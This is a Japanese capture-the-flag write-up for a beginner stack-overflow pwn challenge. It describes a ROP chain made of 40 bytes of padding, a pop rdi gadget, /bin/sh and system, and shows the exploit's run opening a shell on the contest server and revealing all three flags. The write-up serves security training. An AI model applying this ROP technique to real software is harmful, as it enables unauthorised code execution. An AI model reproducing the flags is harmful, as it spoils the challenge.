# Writeup
とりあえず#3でROPしてから全てのフラグを取得していく \
gdbで調べると40バイト埋めてgadgetを入れればROPができそうである（親切に今回は運営がスタックを書いてくれている）

また、/bin/shもsystemもあるため、pop rdi ; retの次に/bin/sh、systemとおけばいけるそのためsolver.pyのようになる

```bash
╭─ /Users/mionorn124/Desktop/CTF-Writteup/katagaitaiCTF2026/Pwn/Beginners Stack(pwn)
╰─ (*'-') < python3 solver.py 
/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/unicorn/unicorn_py3/unicorn.py:123: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] '/Users/mionorn124/Desktop/CTF-Writteup/katagaitaiCTF2026/Pwn/Beginners Stack/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to pwn.katagaitai-ctf.net on port 9002: Done
[*] Switching to interactive mode

[*] check the stack frame! and overwirte 'secret' variable
[*] print stack frame ... 
address            : value            
0x00007ffc6ff560e0 : 0x4141414141414141  <=== buf1
0x00007ffc6ff560e8 : 0x4141414141414141
0x00007ffc6ff560f0 : 0x4141414141414141
0x00007ffc6ff560f8 : 0x4141414141414141  <=== secret
0x00007ffc6ff56100 : 0x4141414141414141
0x00007ffc6ff56108 : 0x00000000004016c3  <=== ret addr
0x00007ffc6ff56110 : 0x0000000000402008
0x00007ffc6ff56118 : 0x000000000040101a
0x00007ffc6ff56120 : 0x0000000000401050
0x00007ffc6ff56128 : 0x00007ffc6ff5000a
0x00007ffc6ff56130 : 0x0000000100000000
0x00007ffc6ff56138 : 0x00000000004011a6
0x00007ffc6ff56140 : 0x0000000000401660
0x00007ffc6ff56148 : 0x5f4f15131f78f315
0x00007ffc6ff56150 : 0x00000000004010c0
0x00007ffc6ff56158 : 0x00007ffc6ff56200

[*] print registers ... 
 [-] RDI Register: 0x00007ffc6ff560e0
 [-] RSI Register: 0x0000794fd64e1723
 [-] RDX Register: 0x0000000000000000

[*] Done ...
$ ls
flag_1
flag_2
flag_3
run
$ cat flag_1
katagaitai-CTF{7hr33_m0r3_f1465_13f7}
$ cat flag_2
katagaitai-CTF{B0F_15_v3ry_d4n63r0u5...}
$ cat falg_3
cat: can't open 'falg_3': No such file or directory
$ cat flag_3
katagaitai-CTF{R37urn_0r13n73d_9r06r4mm1n6!}
```
# flag
```
#1:katagaitai-CTF{7hr33_m0r3_f1465_13f7}
#2:katagaitai-CTF{B0F_15_v3ry_d4n63r0u5...}
#3:katagaitai-CTF{R37urn_0r13n73d_9r06r4mm1n6!}
```